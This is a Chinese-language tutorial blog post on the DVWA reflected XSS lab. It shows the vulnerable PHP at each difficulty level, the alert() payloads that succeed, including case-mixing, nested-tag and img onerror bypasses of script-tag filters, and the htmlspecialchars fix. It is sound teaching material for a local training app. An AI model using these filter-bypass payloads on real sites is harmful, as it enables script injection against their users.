---
layout: post
title: "DVWA XSS (Reflected) (教學用)"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_XSS
author: ""
tags: ['DVWA', 'XSS']
---



# DVWA XSS (Reflected) (教學用)

###### tags: `DVWA`

## low


網址:
```
http://localhost/vulnerabilities/xss_r/
```

輸入111111111111
```htmlembedded
<form name="XSS" action="#" method="GET">
    <p>
        What's your name?
        <input type="text" name="name" />
        <input type="submit" value="Submit" />
    </p>
</form>

```

表單 get 送到原本網址

頁面出現了
```htmlembedded=
<pre>Hello 111111111111</pre>
```

後端大概猜測

```php=
echo "<pre>{$_GET['name']}</pre>";
```

輸入以下 成功
```
<script>alert('123')</script>
```

看一下後端:
```php=
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

猜得差不多。




## medium


### 輸入以下 失敗
```
<script>alert('123')</script>


//顯示
<pre>Hello alert('123')</pre>
```

* script tag 被過濾了

### img payload 成功
```
<img src=x onerror=alert(1)>
```


大概猜測只過濾 script 而已


### 看一下源碼:
```php=

<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>

```

這種只過濾一次的，或是字串過慮的很容易繞過。


大寫
```
<Script>alert('1')</script>
```

雙寫
```
<<script>script>alert('1')</script>
```



## high

script tag  被過濾

```
<script>alert('1')</script>

<<script>script>alert('1')</script>

只剩下 >
```

代表
```
<script 過慮了好幾次 script 應該涼了
```


### img payload 成功
```
<img src=x onerror=alert(1)>
```


說明只過濾 script 但 script 確實無法用了。

不過屬於黑名單，所以防不勝防。


看代碼:
```php=
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>

```
preg_replace  正規表達式
```
(.*) 貪婪匹配

/i 不區分大小寫
```













## impossible
```php=

<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>

```

加上 session token 防止csrf


PHP htmlspecialchars() 函数 特殊符號轉實體.

```
& （和号）成为 &amp;
" （双引号）成为 &quot;
' （单引号）成为 '
< （小于）成为 &lt;
> （大于）成为 &gt;
```


測試網站:
https://emn178.github.io/online-tools/html_encode.html
```
<script>

=>

&lt;script&gt;
```



這題的 impossible  主要使用 htmlspecialchars防禦，但在某些情況下，會失效。可以打pickachu 靶場練一下。